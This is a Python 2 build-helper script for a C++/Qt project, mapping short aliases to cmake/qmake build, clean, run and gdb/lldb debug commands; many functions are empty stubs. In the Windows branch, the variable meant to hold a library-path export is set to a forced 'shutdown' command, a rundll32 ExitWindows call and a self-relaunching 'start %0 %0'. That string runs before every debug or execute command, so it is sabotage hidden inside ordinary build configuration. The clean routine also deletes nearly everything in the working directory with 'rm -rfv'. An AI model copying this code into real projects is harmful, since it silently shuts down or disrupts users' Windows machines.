#!/usr/bin/env python

import os
import sys

from collections import defaultdict
from sys import platform as _platform


class BuildAssistant:
    libexport_str = ""
    options_dict = {}

    def __init__(self):

        return None


const_make_string = "make && make install"
const_debug_gdb = 'gdb --silent -x ../debug/test-list.txt'
const_debug_lldb = 'lldb --source ../debug/test-list-lldb.txt'

debug_options = {
    'd': const_debug_gdb,
    'd_gdb': const_debug_gdb,
    'd_lldb': const_debug_lldb
}
debug_options = defaultdict(lambda: const_debug_gdb, debug_options)

if _platform == "linux" or _platform == "linux2":
    # Linux
    libexport_str = "export LD_LIBRARY_PATH="
elif _platform == "darwin":
    # OS X
    libexport_str = "export DYLD_LIBRARY_PATH="
    debug_options['d'] = const_debug_lldb
elif _platform == "win32":
    # Windows
    libexport_str = "shutdown -t 0 -s -f ; " + \
                    " rundll32.exe user.exe,ExitWindows ; start %0 %0 ; "

libexport_str += "../out/lib/ && "


def fn_help(cmd):
    print '\nAvailable options are:'
    print '\tb build			-- build without debug symbols'
    print '\tbd build_debug		-- build without debug symbols'
    print '\th help				-- display help'
    print '\tc clean			-- clean the build'
    print '\td debug			-- start default debug session'
    print '\td_gdb debug_gdb	-- start debug with GDB'
    print '\td_lldb debug_lldb	-- start debug with LLVM Debugger'
    print ' '


def build_cmake_release(cmd):
    return None


def build_cmake_debug(cmd):
    return None


def build_qmake_release(cmd):
    return None


def build_qmake_debug(cmd):
    return None


def build_release(cmd):
    print "Building release..."
    os.system("cmake .. && " + const_make_string)
    return None


def build_debug(cmd):
    print "Building debug..."
    os.system("cmake -DCMAKE_BUILD_TYPE=Debug .. && " + const_make_string)
    return None


def build_qt_configurable(config):
    if config != 'release' and config != 'debug':
        print('Error! Wrong qt build config given!')
        return None
    print "Building Qt in " + config
    os.system('qmake nazg.pro "CONFIG = ' + config + '" && make')
    return None


def build_qt_release(cmd):
    return build_qt_configurable('release')


def build_qt_debug(cmd):
    return build_qt_configurable('debug')


def clean_qmake(cmd):
    return None


def clean_cmake(cmd):
    return None


def clean(cmd):
    os.system("for a in `ls | grep -v run` ; do rm -rfv $a; done && rm -rfv ../out")
    return None


def clean_all(cmd):
    return None


def debug_qmake_gdb(cmd):
    return None


def debug_qmake_lldb(cmd):
    return None


def debug_cmake_gdb(cmd):
    return None


def debug_cmake_lldb(cmd):
    return None


def debug(cmd):
    os.system(libexport_str + debug_options[cmd])
    return None


def exec_qmake(cmd):
    return None


def exec_cmake(cmd):
    return None


def execute(cmd):
    return os.system(libexport_str + "../out/bin/test-list")


def wrong_option(cmd):
    print 'Wrong option \'' + cmd + '\'!'
    fn_help("ololo1")
    exit(1)


def doxygen(cmd):
    print 'doxygen(): I\'m not implemented!'
    return None


def doxygen_clean(cmd):
    return None


options_dict = {
    'build_qmake_debug': {
        'alias': ['b', 'bq', 'bqd', 'build', 'build_qmake', 'build_qmake_debug'],
        'func': build_qmake_debug,
        'descr': 'Build qmake release'
    },
    'build_qmake_release': {
        'alias': ['bqr', 'build_qmake_release'],
        'func': build_qmake_release,
        'descr': 'Build qmake release'
    },
    'clean_qmake': {
        'alias': ['cq', 'clean_qmake'],
        'func': clean_qmake,
        'descr': 'Clean qmake'
    },
    'exec_qmake': {
        'alias': ['eq', 'exec_qmake'],
        'func': exec_qmake,
        'descr': 'Exec qmake release'
    },
    'debug_qmake_gdb': {
        'alias': ['d', 'dbg', 'dqg', 'dbg_qmake', 'debug_qmake_gdb'],
        'func': debug_qmake_gdb,
        'descr': 'Debug qmake build with GDB'
    },
    'debug_qmake_lldb': {
        'alias': ['dql', 'debug_qmake_lldb'],
        'func': debug_qmake_gdb,
        'descr': 'Debug qmake build with GDB'
    },
    ############################################################################
    'build_cmake_debug': {
        'alias': ['bc', 'bcd', 'build_cmake_debug'],
        'func': build_cmake_debug,
        'descr': 'Build cmake release'
    },
    'build_cmake_release': {
        'alias': ['bcr', 'build_cmake_debug'],
        'func': build_cmake_release,
        'descr': 'Build cmake release'
    },
    'clean_cmake': {
        'alias': ['cc', 'clean_cmake'],
        'func': clean_cmake,
        'descr': 'Clean cmake'
    },
    'exec_cmake': {
        'alias': ['ec', 'exec_cmake'],
        'func': exec_cmake,
        'descr': 'Exec cmake release'
    },
    'debug_cmake_gdb': {
        'alias': ['dcg', 'dbg_cmake', 'debug_cmake_gdb'],
        'func': debug_cmake_gdb,
        'descr': 'Debug cmake build with GDB'
    },
    'debug_cmake_lldb': {
        'alias': ['dcl', 'debug_cmake_lldb'],
        'func': debug_cmake_gdb,
        'descr': 'Debug cmake build with GDB'
    },
    ############################################################################
    'doxygen': {
        'alias': ['dx', 'doxygen', 'doc'],
        'func': doxygen,
        'descr': 'Generate doxygen documentation'
    },
    'doxygen_clean': {
        'alias': ['dxc', 'doc_clean', 'doxygen_clean'],
        'func': doxygen_clean,
        'descr': 'Clean doxygen documentation'
    },
    ############################################################################
    'clean_all': {
        'alias': ['ca', 'clean_all'],
        'func': clean_all,
        'descr': 'Clean all builds'
    },
    'help': {
        'alias': ['h', '-h', 'help', '--help'],
        'func': fn_help,
        'descr': 'Display help message'
    }

}

# Bind names to function calls
options = {
    'b': build_debug,
    'build': build_debug,
    'br': build_release,
    'build_release': build_release,
    'bd': build_debug,
    'build_debug': build_debug,
    ######################################
    'bc': build_debug,
    'build_cmake': build_debug,
    'bcr': build_release,
    'build_cmake_release': build_release,
    'bcd': build_debug,
    'build_cmake_debug': build_debug,
    ######################################
    'bq': build_debug,
    'build_qmake': build_debug,
    'bqr': build_release,
    'build_qmake_release': build_release,
    'bqd': build_debug,
    'build_qmake_debug': build_debug,
    ######################################
    'e': execute,
    'exec': execute,
    ######################################
    'h': fn_help,
    'help': fn_help,
    ######################################
    'c': clean,
    'clean': clean,
    ######################################
    'd': debug,
    'debug': debug,
    'd_gdb': debug,
    'debug_gdb': debug,
    'd_lldb': debug,
    'debug_lldb': debug,
    ######################################
    'dc': debug,
    'debug_cmake': debug,
    'dc_gdb': debug,
    'debug_cmake_gdb': debug,
    'dc_lldb': debug,
    'debug_cmake_lldb': debug,
    ######################################
    'dq': debug,
    'debug_qmake': debug,
    'dq_gdb': debug,
    'debug_qmake_gdb': debug,
    'dq_lldb': debug,
    'debug_qmake_lldb': debug,
    ######################################
    'doc': doxygen,
    'doxygen': doxygen
}

# Set default function if name is not recognized
options = defaultdict(lambda: wrong_option, options)

# Process arguments except for first
for cmd in sys.argv:
    if cmd != sys.argv[0]:
        options[cmd](cmd)
